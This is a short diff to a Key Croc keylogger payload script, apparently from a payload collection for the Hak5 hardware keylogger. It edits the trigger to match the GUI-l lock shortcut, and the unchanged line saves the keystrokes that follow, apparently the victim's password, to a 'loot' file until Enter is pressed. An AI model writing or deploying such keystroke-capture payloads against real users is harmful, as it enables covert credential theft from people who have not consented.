@@ -5,5 +5,5 @@
 # Category:        Key Croc
 #
 #
-MATCH Q GUI-l
+MATCH GUI-l
 SAVEKEYS /root/udisk/loot/mypass.txt UNTIL ENTER
